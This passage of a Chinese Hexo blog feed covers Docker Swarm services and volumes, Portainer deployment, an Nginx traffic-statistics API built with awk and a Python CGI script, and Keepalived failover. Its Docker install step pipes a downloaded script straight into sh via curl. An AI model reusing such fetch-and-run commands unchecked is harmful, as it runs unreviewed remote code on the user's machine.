shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d overlay ngx_net</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看docker网络</span></span><br><span class="line">docker network ls</span><br><span class="line"></span><br><span class="line">docker service create \</span><br><span class="line">--replicas 2 \# 两个副本（一共）</span><br><span class="line">--network ngx_net \ # 虚拟网络</span><br><span class="line">--name my-test \# 服务名</span><br><span class="line">-p 80:80 nginx# 端口映射（本地到容器）</span><br><span class="line"></span><br><span class="line">docker service ps# 查看运行的所有的服务</span><br><span class="line"></span><br><span class="line">docker ps# 查看节点的运行的容器</span><br></pre></td></tr></table></figure><h3 id="服务扩缩容"><a href="#服务扩缩容" class="headerlink" title="服务扩缩容"></a>服务扩缩容</h3><p>Swarm 的一大亮点，就是可以很灵活的进行服务的扩缩容。可以很方便的调整服务的对应的容器的数量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker service scale my-test=1</span><br><span class="line">docker service scale my-test=5</span><br></pre></td></tr></table></figure><h3 id="数据的持久化"><a href="#数据的持久化" class="headerlink" title="数据的持久化"></a>数据的持久化</h3><p>容器和镜像的区别在与其可读性，镜像可以理解为只读的容器。为了数据的持久化，数据应该挂在在硬盘之上，而不是容器智能，否则容器销毁，数据将会消失。</p><p>这里主要有两种办法：</p><ul><li>bind        这里是直接绑定硬盘上的目录和容器内的目录。</li><li>volumes    在主机上建立相应的目录，可以进行统一的管理。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个挂载卷</span></span><br><span class="line">docker volume create --name myvolume</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在容器内挂载卷</span></span><br><span class="line">docker service create \</span><br><span class="line">--replicas 2 \</span><br><span class="line">--network ngx_net \</span><br><span class="line">--mount type=volume,src=myvolume,dst=/wangshibo \</span><br><span class="line">--name test-nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里在容器内执行shell，可以看到文件已经同步</span></span><br><span class="line">docker exec -ti 3618e3d1b966 /bin/bash</span><br></pre></td></tr></table></figure><hr><p>这里再折腾的时候，遇到了很大的问题，后面看到发现是swarm 的特性。当服务有多个副本的时候，在创建的时候，的确会在manager界面对目录进行拷贝。但是，后续再对manager上的文件进行修改，这些修改将不会被同步到各个节点上。需要一个个的进行修改很是麻烦，后面可以试着使用 <strong>NFS</strong> 实现多个镜像的配置文件的统一。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzY4NzAzNTkuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6870359.html">Docker管理工具-Swarm部署记录<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><blockquote><p>当你发现自己的才华撑不起野心时，就请安静下来学习吧</p></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/12/OP_Swarm_%E9%9B%86%E7%BE%A4%E4%BD%BF%E7%94%A8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Docker集群搭建</title>
      <link>https://www.diglp.xyz/2019/03/05/OP_Docker_Swarm/</link>
      <guid>https://www.diglp.xyz/2019/03/05/OP_Docker_Swarm/</guid>
      <pubDate>Mon, 04 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;快速部署&quot;&gt;&lt;a href=&quot;#快速部署&quot; class=&quot;headerlink&quot; title=&quot;快速部署&quot;&gt;&lt;/a&gt;快速部署&lt;/h2&gt;&lt;h3 id=&quot;Docker-的安装&quot;&gt;&lt;a href=&quot;#Docker-的安装&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="快速部署"><a href="#快速部署" class="headerlink" title="快速部署"></a>快速部署</h2><h3 id="Docker-的安装"><a href="#Docker-的安装" class="headerlink" title="Docker 的安装"></a>Docker 的安装</h3><p>Docker 的安装，这里直接使用官方提供的一键安装的脚本。一路绿灯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><h3 id="创建Swarm集群"><a href="#创建Swarm集群" class="headerlink" title="创建Swarm集群"></a>创建Swarm集群</h3><p>直接使用 Docker 的 <code>swarm</code> 来进行集群的创建。直接通过help可以查看相关的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 初始化 Swarm 集群</span><br><span class="line">docker swarm init --advertise-addr 192.168.xxx.xxx# 这里是主机的地址 注意保持静态 IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 得到 Worker 的join-token</span><br><span class="line">docker swarm join-token worker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 输入join之后直接加入集群</span><br><span class="line">docker node ls</span><br><span class="line">ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSION</span><br><span class="line">6km4644t62w3h3g7iujceerl1 *   bgb1         Ready               Active              Leader              18.06.3-ce</span><br><span class="line">kwi9t231ulc2dry75zzg52580     bgb2         Ready               Active                                  18.06.3-ce</span><br></pre></td></tr></table></figure><h3 id="Portainer-服务部署"><a href="#Portainer-服务部署" class="headerlink" title="Portainer 服务部署"></a>Portainer 服务部署</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>拉镜像</span><br><span class="line">docker pull portainer/portainer</span><br><span class="line"><span class="meta">#</span> 创建挂载卷</span><br><span class="line">docker volume create portainer_data</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 创建挂载目录,不然后面挂载会报错</span><br><span class="line">mkdir -p /opt/portainer</span><br><span class="line"></span><br><span class="line">docker service create \</span><br><span class="line">--name portainer \</span><br><span class="line">--publish 9000:9000 \</span><br><span class="line">--replicas=1 \</span><br><span class="line">--constraint 'node.role == manager' \</span><br><span class="line">--mount type=bind,src=//var/run/docker.sock,dst=/var/run/docker.sock \</span><br><span class="line">--mount type=bind,src=//opt/portainer,dst=/data \</span><br><span class="line">portainer/portainer \</span><br><span class="line">-H unix:///var/run/docker.sock</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 列出所有的服务</span><br><span class="line">docker service ls</span><br><span class="line">ID                  NAME                MODE                REPLICAS            IMAGE                        PORTS</span><br><span class="line">plmkdifqivcs        mAgent_agent        global              4/4                 portainer/agent:latest</span><br></pre></td></tr></table></figure><hr><p>这里注意的是，这里的部署是服务部署，而不是单个容器的部署。</p><p>容器的部署是针对与单个节点的。在上面的部署方式也可以使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</span><br></pre></td></tr></table></figure><p>这里的问题是，这个命令只是在单主机的 Node 上对该镜像进行了部署。如果进行服务的访问，<strong>只能通过该主机的Hostname</strong> 进行访问。</p><p>但是一旦进行了一个服务的部署，那么所有的节点IP，都会做一个统一的映射，继而都可以对该服务进行访问。（这里选择的网络接口是 Ingress ，直接和主机网络共享，并且在服务的子网内，这些容器是自动进行负载均衡的。全自动的！</p><p>至此，整个 <strong>Swarm</strong> 集群搭建完成，并且使用了轻量级的容器管理系统 <strong>Portainer</strong> 。</p><h2 id="笔记s"><a href="#笔记s" class="headerlink" title="笔记s"></a>笔记s</h2><p>这里，自己折腾了一下简单的部署，实际的应用后面还有很长很长的路要走。这个section记录一下途中遇上的坑：</p><ul><li>Manager节点需要配置静态 IP ，因为 advertise 的地址是固定的，否则会发现IP改变之后节点全部 Down 掉。</li><li>在跑 Portainer 的注意检查其挂载的目录是否真实存在，否则报错。（bind，和mount）</li><li>Agent 的部署好像很吃内存。</li><li>脚本安装Docker 的时候，被CDN坑，没办法</li></ul><h2 id="资料："><a href="#资料：" class="headerlink" title="资料："></a>资料：</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvZG9ja2VyLXN3YXJtLWd1aWRlcy9SRUFETUUubWQ=" title="https://www.bookstack.cn/read/docker-swarm-guides/README.md">Docker Swarm 深入浅出<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vc3RvcmFnZS9iaW5kLW1vdW50cy8=" title="https://docs.docker.com/storage/bind-mounts/">Use bind mounts<i class="fa fa-external-link"></i></span></li></ul>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/05/OP_Docker_Swarm/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 访问量统计接口</title>
      <link>https://www.diglp.xyz/2019/03/03/OP_Nginx%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1%E6%8E%A5%E5%8F%A3/</link>
      <guid>https://www.diglp.xyz/2019/03/03/OP_Nginx%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1%E6%8E%A5%E5%8F%A3/</guid>
      <pubDate>Sat, 02 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这个post来自于之前偶遇的一个页面上的组件：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这个post来自于之前偶遇的一个页面上的组件：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwLw==" title="https://rsshub.app/">Welcome to RSSHub!<i class="fa fa-external-link"></i></span> 万物皆可订阅的RRSHUB</p></blockquote><p>上面的那个Debug 的统计，就是显得十分的帅气了，想着自己也搞一个？</p><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><p>当然,这里也没什么数据库的，直接是用shell出来的，根据日志的格式来进行解析，参考页面：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81MzdhMGJkZGRhOTQ=" title="https://www.jianshu.com/p/537a0bddda94">统计Nginx访问量 - 简书<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MDBlMTY4ZTI0NjM=" title="https://www.jianshu.com/p/800e168e2463">nginx cache查看缓存命中率<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>这些操作都是基于 Nginx 日志进行操作的，这里列举一条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111.59.124.138 - - [25/Feb/2019:15:31:26 +0800] &quot;GET / HTTP/2.0&quot; 200 12628 &quot;-&quot; &quot;Mozilla/5.    0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.10    9 Safari/537.36&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>使用awk对参数进行提取，默认以空格进行分割。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;print $1&#125;'  /var/log/nginx/access.log|sort | uniq -c |wc -l</span><br><span class="line"></span><br><span class="line">awk '&#123;print $7&#125;' /var/log/nginx/access.log|wc -l</span><br><span class="line"></span><br><span class="line">awk '&#123;print $7&#125;' /var/log/nginx/access.log|sort | uniq -c |sort -n -k 1 -r|head 10</span><br><span class="line"></span><br><span class="line">awk '&#123;print $1&#125;' /var/log/nginx/access.log|sort | uniq -c |sort -n -k 1 -r|head 10</span><br></pre></td></tr></table></figure><blockquote><p>UV 和 PV：<strong>UV（Unique visitor）</strong> 24小时内的单个自然人， <strong>PV（Page View）</strong> 页面点击量。 </p></blockquote><hr><p>这里学好 <code>awk</code> 和 <code>sed</code> 和 <code>xargs</code> 后面我要开专题。 通过 Shell 的天然的特性。就可以得到响应的内容。</p><h2 id="CGI脚本"><a href="#CGI脚本" class="headerlink" title="CGI脚本"></a>CGI脚本</h2><p>得到统计提取的脚本之后，这里直接进行通过wsgi实现接口。供前端调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-Type: application/json"</span>)</span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">query = &#123;</span><br><span class="line">    <span class="string">'uv'</span>:<span class="string">"awk '&#123;print $1&#125;'  /var/log/nginx/xxxx.xxx.cf.log|sort | uniq -c |wc -l"</span>,</span><br><span class="line">    <span class="string">'pv'</span>:<span class="string">"awk '&#123;print $7&#125;' /var/log/nginx/xxxx.xxx.cf.log|wc -l"</span>,</span><br><span class="line">    <span class="string">'hoturl'</span>:<span class="string">"awk '&#123;print $7&#125;' /var/log/nginx/xxxx.xxx.cf.log|sort | uniq -c |sort -n -k 1 -r|head"</span>,</span><br><span class="line">    <span class="string">'hotip'</span>:<span class="string">"awk '&#123;print $1&#125;' /var/log/nginx/xxxx.xxx.cf.log|sort | uniq -c |sort -n -k 1 -r|head"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = dict(zip(query, map(<span class="keyword">lambda</span> x: os.popen(x).read(), query.values())))</span><br><span class="line">result = json.dumps(resp)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><hr><p>前端使用 <code>AJAX</code> 进行请求，拉取数据，进行基本处理即可，这里的问题存在：<code>CC攻击</code> 的问题，这里直接使用 Shell 调用，如果接口被压测，可能占用大量的 IO资源。所以优化方案是 数据入库。</p><h2 id="前端处理"><a href="#前端处理" class="headerlink" title="前端处理"></a>前端处理</h2><p>前端通过 <code>AJAX</code> 对接口动态调用，拉取数据。之后进行处理和动态刷新。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $.get(<span class="string">'/get_dbg/'</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">'#PV'</span>).text(<span class="string">'站点PV:  '</span>+ data.pv)</span><br><span class="line">            $(<span class="string">'#UV'</span>).text(<span class="string">'站点UV:  '</span>+ data.uv)</span><br><span class="line">            $(<span class="string">'#hotip'</span>).html(<span class="string">'&lt;br&gt;'</span> + data.hotip.replace(<span class="regexp">/\n/g</span>, <span class="string">'&lt;br&gt;'</span>))</span><br><span class="line">            $(<span class="string">'#hoturl'</span>).html(<span class="string">'&lt;br&gt;'</span> + data.hoturl.replace(<span class="regexp">/\n/g</span>, <span class="string">'&lt;br&gt;'</span>))</span><br><span class="line">        &#125;)；</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这里进行全局的 <code>\n</code> 替换，使内容换行。对页面进行刷新即可。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这里做了 nginx 的日志的统计，进行对部分服务质量的反馈。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/03/OP_Nginx%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1%E6%8E%A5%E5%8F%A3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Keepalive 实现 HA</title>
      <link>https://www.diglp.xyz/2019/03/01/OP_KeepAlive%E5%AE%9E%E7%8E%B0HA/</link>
      <guid>https://www.diglp.xyz/2019/03/01/OP_KeepAlive%E5%AE%9E%E7%8E%B0HA/</guid>
      <pubDate>Thu, 28 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;&lt;code&gt;HA(High Availability)&lt;/code&gt;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p><code>HA(High Availability)</code> 高可用，是衡量一个系统的重要指标。所以双机热备，成为一个好的和通用的选择。前面的的方案直接使用了nginx 的Upstream，来实现了 <strong>双机</strong> 的过程。<br>虽然是可以实现在单节点down掉之后系统依旧可用，不过显得不是那么专业。这里就使用 KeepAlive 来实现系统的 <strong>双机过程</strong>。</p><hr><blockquote><ol><li>nginx进程基于Master+Slave(worker)多进程模型，自身具有非常稳定的子进程管理功能。在Master进程分配模式下，Master进程永远不进行业务处理，只是进行任务分发，从而达到Master进程的存活高可靠性，Slave(worker)进程所有的业务信号都 由主进程发出，Slave(worker)进程所有的超时任务都会被Master中止，属于非阻塞式任务模型。</li><li>Keepalived是Linux下面实现VRRP备份路由的高可靠性运行件。基于Keepalived设计的服务模式能够真正做到主服务器和备份服务器故障时IP瞬间无缝交接。二者结合，可以构架出比较稳定的软件LB方案。</li></ol><p>引用自 <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzYxMzgxODUuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6138185.html">Nginx+keepalived 双机热备（主从模式）<i class="fa fa-external-link"></i></span></p></blockquote><hr><h2 id="Keepalive-基本概念"><a href="#Keepalive-基本概念" class="headerlink" title="Keepalive 基本概念"></a>Keepalive 基本概念</h2><p>KeepAlived 使用了 <code>VRRP</code> 来避免IP的单点故障。VRRP全称 Virtual Router Redundancy Protocol，即 虚拟路由冗余协议。简单的说，在一个子网IP，后面其实对应了 N 台主机。这些主机再构成一个路由器组。这个单独的虚拟ip，复杂对数据包的转发。这里也就有了传说中的 <strong>VIP （virtual IP）</strong>。</p><p>简单的一句话来讲：多个IP被放在一个路由组，虚拟成一个 IP。</p><p>这里有主机和从机。当主机不可用时候，回自主更新路由对应的MAC（设备）。</p><h2 id="Keepailve-简易配置"><a href="#Keepailve-简易配置" class="headerlink" title="Keepailve 简易配置"></a>Keepailve 简易配置</h2><p>这里直接在两台主机上安装 <code>keepalive</code> ，在 <code>/etc/keepalive/keepalive.conf</code> 里面进行配置。 这里也直接贴配置了，因为是直接 Copy的。。。</p><blockquote><p>示例配置在项目官网可见：<span class="exturl" data-url="aHR0cDovL3d3dy5rZWVwYWxpdmVkLm9yZy9tYW5wYWdlLmh0bWw=" title="http://www.keepalived.org/manpage.html">http://www.keepalived.org/manpage.html<i class="fa fa-external-link"></i></span></p></blockquote><p>主机配置如下，定义了节点名称，网络接口，认证方式以及 <strong>VIP</strong>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">global_defs</span> &#123;  </span><br><span class="line">    <span class="attribute">router_id</span> NodeA<span class="comment"># 不同节点的不同命名  </span></span><br><span class="line">    router_id NodeB <span class="comment">#################</span></span><br><span class="line">&#125;  </span><br><span class="line">vrrp_instance VI_1 &#123;  </span><br><span class="line">    <span class="attribute">state</span> MASTER    <span class="comment">#设置为主服务器  </span></span><br><span class="line">    state BACKUP    <span class="comment">#设置为备服务器 ###############</span></span><br><span class="line">        </span><br><span class="line">    interface eth0  <span class="comment">#监测网络接口  </span></span><br><span class="line">    virtual_router_id <span class="number">51</span>  <span class="comment">#主、备必须一样  </span></span><br><span class="line">    </span><br><span class="line">    priority <span class="number">99</span>   <span class="comment">#(主、备机取不同的优先级，主机值较大，备份&gt;机值较小,值越大优先级越高)</span></span><br><span class="line">    </span><br><span class="line">    advert_int <span class="number">1</span>   <span class="comment">#VRRP Multicast广播周期秒数  </span></span><br><span class="line">    authentication &#123;  </span><br><span class="line">        <span class="attribute">auth_type</span> PASS  <span class="comment">#VRRP认证方式，主备必须一致  </span></span><br><span class="line">        auth_pass *****<span class="comment">#(密码)  </span></span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;  </span><br><span class="line">        192.168.1.200/24  #VRRP HA虚拟地址  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>上面直接给出了器可用的配置文件，主从之间的差距就是那么几行。之后使用 <code>service</code> 重启服务即可。</p><h3 id="效果验证"><a href="#效果验证" class="headerlink" title="效果验证"></a>效果验证</h3><p>在主机或者路由里可以看到 <code>arp -a</code> 里面，192.168.1.200 的这个IP的路由已经被注册了，而且后面的MAC正是我们的 <strong>Master</strong> 的MAC地址。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span>           <span class="number">20</span>-<span class="number">76</span>-<span class="number">93</span>-<span class="number">46</span>-<span class="number">68</span>-e3     动态</span><br><span class="line">...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.200</span>         <span class="number">2</span>c-<span class="number">4</span>d-<span class="number">54</span>-<span class="number">42</span>-<span class="number">9</span>b-<span class="number">0</span>a     动态</span><br><span class="line"><span class="comment">######################################################################</span></span><br><span class="line">➜  keepalived ifconfig </span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">192.168</span>.<span class="number">1.129</span>  netmask <span class="number">255.255</span>.<span class="number">255.0</span>  broadcast <span class="number">192.168</span>.<span class="number">1.255</span></span><br><span class="line">        inet6 fe80::cffe:<span class="number">4</span>eee:f129:de22  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        ether <span class="number">2</span>c:<span class="number">4</span>d:<span class="number">54</span>:<span class="number">42</span>:<span class="number">9</span>b:<span class="number">0</span>a  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">464842</span>  bytes <span class="number">188082136</span> (<span class="number">179.3</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">506574</span>  bytes <span class="number">162269596</span> (<span class="number">154.7</span> MiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line">        device interrupt <span class="number">43</span></span><br></pre></td></tr></table></figure><p>当<strong>拔掉 MASTER 主机的网线</strong>之后：可以看到地址绑定的MAC地址，飞速的就切换了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span>           <span class="number">20</span>-<span class="number">76</span>-<span class="number">93</span>-<span class="number">46</span>-<span class="number">68</span>-e3     动态</span><br><span class="line">...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.200</span>         b8-<span class="number">27</span>-eb-eb-<span class="number">17</span>-<span class="number">72</span>     动态</span><br><span class="line"><span class="comment">#######################################################################</span></span><br></pre></td></tr></table></figure><p>至此可见，Keepalive 的热备效果实现了在一个 VIP 下的双机热备。在单主机下线情况下快速切换。</p><hr><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>当前的配置实际上并不合理，只有在主机掉线后才会进行主从切换。很多实话是某个服务（比如 Nginx）挂掉了导致的服务不可用。所以后面回就需要更高阶的使用，加上对服务进行检测的功能。</p><h2 id="Keepavlived-监控配置"><a href="#Keepavlived-监控配置" class="headerlink" title="Keepavlived 监控配置"></a>Keepavlived 监控配置</h2><p>入上面的提到的问题，在这种情况下，只适用于 <strong>MASTER</strong> 节点down掉的情况下，才会重新选取 Backup节点。然很多时候实际上是服务出了问题而不是主机（比如 Nginx 服务挂掉），那么在这种情况下就不能及时的切换到备机。</p><p>所以这里的配置就需要更进一步，来实现监控的过程。对于 Nignx 的web服务来讲，可以有以下的方式：</p><ul><li>监控 Nginx 进程</li><li>监控 Nginx 端口</li><li>监控 Nginx 的请求返回</li></ul><p>这三种方法，的可靠性也是依次提升的。</p><blockquote><p>这里参考文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzYxMzgxODUuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6138185.html">Nginx+keepalived 双机热备（主从模式）<i class="fa fa-external-link"></i></span> </p><p>里面对细节讲的相当的详细</p></blockquote><hr><p>在配置文件里，可以使用 <code>vrrp_script</code> 域来自定义检测脚本。示例如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vrrp_script</span> chk_http_port &#123;         </span><br><span class="line">    <span class="attribute">script</span> <span class="string">"/opt/chk_nginx.sh"</span><span class="comment"># 指定检测脚本</span></span><br><span class="line">    interval <span class="number">2</span>                      <span class="comment"># 检测间隔</span></span><br><span class="line">    weight -<span class="number">5</span>                       <span class="comment"># 故障时权重值 -5</span></span><br><span class="line">    fall <span class="number">2</span>                   <span class="comment"># 故障判断次数，连续两次算故障</span></span><br><span class="line">    rise <span class="number">1</span>                  <span class="comment"># 检测成功，一次算成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里要提示一下keepalived.conf中vrrp_script配置区的script一般有2种写法：<br>1）通过脚本执行的返回结果，<strong>改变优先级</strong>，keepalived继续发送通告消息，backup比较优先级再决定。这是直接监控Nginx进程的方式。<br>2）脚本里面检测到异常，<strong>直接关闭keepalived进程</strong>，backup机器接收不到advertisement会抢占IP。这是检查NginX端口的方式。</p></blockquote><hr><p>用于检测的 <strong>Nginx</strong> 进程的脚本如下，用Shell脚本对进程进行检测，统计进程数量，如果进程挂掉，就尝试重启进程，如果进程无法拉起，那么就直接停掉本机的 <code>keepalive</code> ，让 VIP 漂移到从机上。这里使用的就是第二种方法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 